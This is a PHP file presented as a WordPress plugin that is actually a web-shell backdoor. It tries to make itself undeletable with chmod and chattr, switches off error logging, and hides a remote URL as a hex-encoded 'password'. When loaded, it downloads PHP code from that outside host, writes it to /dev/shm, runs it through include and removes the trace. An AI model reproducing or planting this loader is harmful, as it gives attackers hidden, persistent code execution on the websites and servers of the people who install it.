<?php
    /*
    Plugin Name: Cheap & Becek Wordpress 
    Plugin URI: https://github.com//wordpress-shell
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
    Author: Azz
    Version: 0.3
    Author URI: https://github.io
    */

# attempt to protect myself from deletion
$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");

# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
error_reporting(0);
ini_set('display_errors', '0');
ini_set('log_errors', '0');

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        
        
        $opt1 = constant('CURLOPT_RETURNTRANSFER');
        $opt2 = constant('CURLOPT_FOLLOWLOCATION');
        $opt3 = constant('CURLOPT_USERAGENT');
        $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
        $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
        $opt6 = constant('CURLOPT_COOKIE');

        
        curl_setopt($conn, $opt1, 1);
        curl_setopt($conn, $opt2, 1);
        curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, $opt4, 0);
        curl_setopt($conn, $opt5, 0);

        if (isset($_SESSION['java'])) {
            curl_setopt($conn, $opt6, $_SESSION['java']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

$password = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f706570652e706870'; //default pass tbl
function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}


function clean_old_temp_files() {
    $temp_files = glob('/dev/shm/prefix*');
    foreach ($temp_files as $file) {
        if (is_file($file)) {
            unlink($file);
        }
    }
}


clean_old_temp_files();

$url = hex2str($password);
$a = geturlsinfo($url);
$temporary_file = tempnam('/dev/shm', 'prefix');
file_put_contents($temporary_file, $a);
include $temporary_file;
unlink($temporary_file);
?>
